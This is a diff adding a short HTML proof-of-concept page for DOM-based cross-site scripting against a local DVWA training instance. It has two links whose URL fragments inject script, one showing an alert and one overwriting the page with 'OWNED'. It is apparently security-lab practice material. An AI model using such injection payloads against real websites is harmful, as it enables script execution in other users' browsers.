@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DOM XSS PoC</title>
+</head>
+<body>
+
+<h2>Click to view content</h2>
+
+<a href="http://localhost:8080/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>">
+    Open DVWA and alert
+</a>
+<br>
+<a href="http://localhost:8080/vulnerabilities/xss_d/?default=English#<script>document.body.innerHTML='OWNED'</script>">
+    Change title
+</a>
+
+</body>
+</html>
